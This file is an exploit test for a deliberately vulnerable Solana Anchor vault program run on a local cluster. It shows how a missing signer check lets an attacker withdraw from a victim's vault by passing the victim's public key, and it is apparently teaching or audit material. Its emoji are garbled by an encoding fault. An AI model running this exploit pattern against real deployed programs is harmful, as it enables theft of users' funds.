/**
 * EXPLOIT TEST: Missing Signer Check (Anchor)
 * 
 * This test demonstrates the missing signer check vulnerability in the Anchor program.
 * 
 * Vulnerability: The withdraw instruction uses AccountInfo<'info> instead of Signer<'info>,
 * allowing anyone to withdraw funds by simply passing the victim's public key without
 * actually signing the transaction.
 * 
 * Expected Result: The exploit should SUCCEED, demonstrating the vulnerability.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";

describe("01-missing-signer-check: Anchor Exploit", () => {
  // Configure the client to use the local cluster
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const PROGRAM_ID = new PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");

  it("Exploits missing signer check to drain victim's vault", async () => {
    console.log("\nüéØ EXPLOIT: Missing Signer Check (Anchor)\n");

    // Load the vulnerable program
    const idl = await Program.fetchIdl(PROGRAM_ID, provider);
    if (!idl) {
      throw new Error("IDL not found. Make sure the program is deployed.");
    }
    const program = new Program(idl, PROGRAM_ID, provider);

    // Create victim and attacker wallets
    const victim = Keypair.generate();
    const attacker = Keypair.generate();

    console.log("üë§ Victim:", victim.publicKey.toBase58());
    console.log("ü¶π Attacker:", attacker.publicKey.toBase58());

    // Airdrop SOL to victim and attacker
    const airdropVictim = await provider.connection.requestAirdrop(
      victim.publicKey,
      2 * LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdropVictim);

    const airdropAttacker = await provider.connection.requestAirdrop(
      attacker.publicKey,
      1 * LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdropAttacker);

    // Derive vault PDA for victim
    const [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), victim.publicKey.toBuffer()],
      PROGRAM_ID
    );

    console.log("üè¶ Vault PDA:", vaultPda.toBase58());

    // Step 1: Victim initializes their vault
    console.log("\nüìù Step 1: Victim initializes vault...");
    await program.methods
      .initialize()
      .accounts({
        user: victim.publicKey,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    console.log("‚úÖ Vault initialized");

    // Step 2: Victim deposits funds
    const depositAmount = 1 * LAMPORTS_PER_SOL;
    console.log(`\nüí∞ Step 2: Victim deposits ${depositAmount / LAMPORTS_PER_SOL} SOL...`);
    
    await program.methods
      .deposit(new anchor.BN(depositAmount))
      .accounts({
        user: victim.publicKey,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    const vaultBalanceAfterDeposit = await provider.connection.getBalance(vaultPda);
    console.log(`‚úÖ Vault balance: ${vaultBalanceAfterDeposit / LAMPORTS_PER_SOL} SOL`);

    // Step 3: Attacker attempts to withdraw (EXPLOIT)
    const withdrawAmount = 0.5 * LAMPORTS_PER_SOL;
    console.log(`\nüö® Step 3: Attacker attempts to withdraw ${withdrawAmount / LAMPORTS_PER_SOL} SOL...`);
    console.log("‚ö†Ô∏è  Using victim's public key but attacker's signature!");

    const attackerBalanceBefore = await provider.connection.getBalance(attacker.publicKey);

    try {
      // ‚ùå VULNERABILITY: The program doesn't check if 'user' is a signer
      // The attacker signs the transaction but passes the victim's public key
      await program.methods
        .withdraw(new anchor.BN(withdrawAmount))
        .accounts({
          user: victim.publicKey, // ‚ùå Victim's key, not attacker's
          vault: vaultPda,
        })
        .signers([attacker]) // ‚ùå But attacker signs!
        .rpc();

      const attackerBalanceAfter = await provider.connection.getBalance(attacker.publicKey);
      const vaultBalanceAfter = await provider.connection.getBalance(vaultPda);

      console.log("\nüí• EXPLOIT SUCCESSFUL!");
      console.log(`ü¶π Attacker balance change: +${(attackerBalanceAfter - attackerBalanceBefore) / LAMPORTS_PER_SOL} SOL`);
      console.log(`üè¶ Vault balance after exploit: ${vaultBalanceAfter / LAMPORTS_PER_SOL} SOL`);
      console.log("\n‚ö†Ô∏è  The vulnerability allowed unauthorized withdrawal!");

    } catch (error) {
      console.log("\n‚ùå EXPLOIT FAILED (unexpected)");
      console.log("Error:", error.message);
      throw new Error("Exploit should have succeeded but failed. Check program deployment.");
    }
  });
});
